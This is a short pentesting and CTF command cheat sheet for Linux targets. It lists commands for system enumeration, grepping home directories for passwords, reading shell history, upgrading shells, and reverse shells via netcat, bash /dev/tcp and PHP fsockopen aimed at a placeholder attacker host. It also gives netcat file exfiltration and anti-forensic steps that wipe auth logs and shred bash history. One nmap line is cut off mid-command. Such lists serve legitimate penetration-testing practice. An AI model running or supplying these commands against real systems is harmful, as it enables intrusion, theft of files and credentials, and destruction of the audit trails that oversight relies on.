PENTESTING/CTF COMMANDS

ALWAYS RUNS:


Enumerate System:

	id  --- get current username and group
	w --- see logged on users
	who -a --- get user info
	uname -a  --- Kernel/CPU Version
	
	cat /etc/passwd | cut -d ':' -f 1 ---- show users on system
	cat /etc/issue --- Show OS Info
	cat /etc/*release* --- Show OS version info
	cat /proc/version --- Show Kernel info
	
	ls /var/spool/cron --- show cron files


Recent Activity
	last -a --- Show last users logged on
	history --- Show last commands entered
	cat ~/.*sh_history --- show bash history

Caveman moves:
	cd /home/; grep -Ri 'password' . --- look for the string 'password' in the /home/ dir
	cd /dev/;  grep -Ri 'password' . --- look for the string 'password' in the /dev/ dir



CLEAN UP
	echo '' > /var/log/auth.log --- clear auth log
	echo '' > ~/.*sh_history --- clear bash history file
	shred -fuz ~/*sh_history --- destroy bash history file
	history -c --- clear history file for user


IMPROVE SHELL
	GET TTY
	python -c 'import pty;pty.spawn("/bin/sh")'
	echo os.system('/bin/bash')
	/bin/sh -i   (best for Ubuntu Server)
	perl â€”e 'exec "/bin/sh";'
	perl: exec "/bin/sh";
	:!bash  ---- From inside vi editor
	


REVERSE SHELL COMMANDS
	LISTENER - TO BE RUN ON LOCAL MACHINE FIRST
	nc -lnvp PORTNUM

	
	TO BE RUN ON REMOTE MACHINE WHILE LOCAL MACHINE HAS LISTENER UP
	nc local.machine.ip.addr PORTNUM -e /bin/sh ---- Unix Machines
	nc local.machine.ip.addr PORTNUM -e cmd.exe ---- Windows machines

	bash -i >& /dev/tcp/local.machine.ip.addr/PORTNUM 0>&1

	php -r '$sock=fsockopen("local.machine.ip.addr","PORTNUM");exec("/bin/sh -i <&3 >&3 2>&3");'



NCAT
	nc -lp PORTNUM -e /bin/sh    ---- run on remote machine, then connect from local
	
	FILE TRANSFER -> Local to Remote
	nc -lp PORTNUM < FILENAME ---- run on local
	nc -w3 local.machine.ip.addr PORTNUM > FILENAME ---- run on remote

	FILE TRANSFER -> Remote to Local
	nc -lp PORTNUM > FILENAME --- run on local
	nc -w3 local.machine.ip.addr PORTNUM < FILENAME --- run on remote

NMAP COMMANDS
	nmap -sn -T4 The.IP.Addr.0/24   -- pings The.IP.Addr.0-255, discovers hosts
	nmap -sV -


MISC COMMANDS

find / -perm -4000 2>/dev/null


